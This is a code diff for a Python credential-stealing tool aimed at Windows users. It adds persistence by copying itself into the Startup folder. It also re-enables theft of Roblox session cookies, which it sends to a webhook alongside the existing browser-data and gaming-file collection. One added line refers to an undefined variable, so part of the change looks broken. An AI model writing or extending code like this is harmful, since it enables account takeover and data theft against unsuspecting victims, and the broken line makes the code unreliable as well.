@@ -12,7 +12,7 @@ import psutil
 from base64 import b64decode
 from json import loads as json_loads
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
-from sys import executable
+from sys import executable, argv
 from sqlite3 import connect as sql_connect
 from urllib.request import Request, urlopen
 from json import loads, dumps
@@ -70,6 +70,7 @@ eb_footer = cc.get_footer()
 local = os.getenv("LOCALAPPDATA")
 roaming = os.getenv("APPDATA")
 temp = os.getenv("TEMP")
+startup_loc = roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
 Threadlist = []
 DETECTED = False
 
@@ -83,6 +84,18 @@ payload3 = {"content": "https://cdn.discordapp.com/emojis/1084901431531798641.gi
 response = requests.post(webhook, json=payload1)
 response = requests.post(webhook, json=payload2)
 response = requests.post(webhook, json=payload3)
+
+
+def StartUp():
+    try:
+        shutil.copy2(argv[0], startup_loc)
+    except Exception:
+        try:
+            shutil.copy2(argv[0], startup_loc)
+        except Exception:
+            pass
+
+StartUp()
 
 
 def GetData(blob_out):
@@ -320,7 +333,6 @@ def RobloxCookie(path, arg):
 
 
 def UploadRobloxCookie(webhook):
-    return
     headers = {"Cookie": ".ROBLOSECURITY=" + roblox_cookie}
     info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
     data = {
@@ -887,7 +899,6 @@ GamingZip = []
 OtherZip = []
 
 GatherAll()
-#RobloxCookie()
 injection.InjectionX(webhook)
 DETECTED = Trust(Cookies)
 DETECTED = False
@@ -913,6 +924,14 @@ if not DETECTED:
                 filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
             filetext += "\n"
     upload("kiwi", filetext)
+
+    
+name = arg
+path = os.getenv("TEMP") + f"\wp{name}.txt"
+
+RobloxCookie(path, arg)
+UploadRobloxCookie(webhook)
+
 
 username = getpass.getuser()
 
